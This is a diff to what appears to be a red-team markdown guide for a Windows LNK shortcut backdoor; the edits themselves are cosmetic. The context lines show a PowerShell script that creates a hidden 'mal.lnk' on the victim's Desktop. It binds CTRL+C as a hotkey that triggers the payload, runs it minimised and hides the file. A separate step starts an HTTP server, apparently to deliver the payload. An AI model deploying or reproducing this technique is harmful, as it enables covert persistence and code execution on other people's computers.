@@ -33,7 +33,7 @@ Note: The TargetPath has a limit of 260 characters long
 ---
 
 ```powershell
-$shortcutPath = "C:\Users\" + $env:username + "\Desktop\mal.lnk"
+$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\mal.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)
 
@@ -53,12 +53,14 @@ $Shortcut.Description = "A shortcut backdoor"
 $Shortcut.IconLocation = 'shell32.dll,21'
 $Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload
 $Shortcut.WindowStyle = 7
-$Shortcut.WorkingDirectory = "C:\Users\" + $env:username + "\Public"
+$Shortcut.WorkingDirectory = "C:\Users\" + $Env:USERNAME + "\Public"
 $Shortcut.Save()
 attrib +h $shortcutPath
 ```
 
-`$ sudo python -m http.server 80`
+```
+$ sudo python -m http.server 80
+```
 
 ## 02 - Automated
 
